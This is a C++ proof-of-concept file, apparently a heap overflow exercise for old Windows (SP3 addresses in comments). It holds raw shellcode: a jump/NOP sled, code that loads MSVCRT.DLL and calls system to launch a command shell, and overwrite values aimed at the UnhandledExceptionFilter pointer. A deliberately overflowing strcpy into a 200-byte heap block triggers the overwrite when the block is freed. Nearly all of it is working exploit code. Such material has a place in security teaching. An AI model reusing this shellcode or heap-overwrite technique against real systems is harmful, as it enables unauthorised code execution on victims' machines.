// heap.cpp  
#include "stdafx.h"  
#include <windows.h>  
#include <stdio.h>  
#include <stdlib.h>  
  
char mybuf[] =   
"\xeb\x06"  
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"  
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"  
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"  
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"  
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"  
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"  
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"  
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"  
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90" //Jmp 06和NOPS 共101 bytes  
  
"\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53"  
"\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6"  
"\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA"  
"\xfb\x68\xe6\x77" //sp3 loadlibrary地址0x77e668fb  
"\x52\x8D\x45\xF4\x50"   
"\xFF\x55\xF0"  
"\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D\x89\x45\xF4\xB8\x61\x6E\x64\x2E"   
"\x89\x45\xF8\xB8\x63\x6F\x6D\x22\x89\x45\xFC\x33\xD2\x88\x55\xFF\x8D\x45\xF4"   
"\x50\xB8"  
"\xbf\x8e\x01\x78" //system地址  
"\xFF\xD0"  
  
"\x30\x70\x40\xff" //heap addr in memory 0x00407030  
"\x4c\x04\xec\x77";//UnhandledExceptionFilter  
  
int main (int argc, char *argv[])  
{  
    HANDLE hHeap;  
    char *buf1, *buf2;  
    //我们自己建立一个HEAP  
    hHeap = HeapCreate(HEAP_GENERATE_EXCEPTIONS, 0x10000, 0xfffff);  
  
    printf("mybuf addr = %p\n",mybuf);  
    //动态分配buf1  
    buf1 = (char*)HeapAlloc(hHeap, 0, 200);  
    strcpy(buf1,mybuf);  
    buf1[211]=0x0;  
    printf("buf1 = %s\n",buf1);  
    //动态分配buf2  
    buf2 = (char*)HeapAlloc(hHeap, 0, 16);  
    HeapFree(hHeap, 0, buf1);  
    HeapFree(hHeap, 0, buf2);  
    return 0;  
} 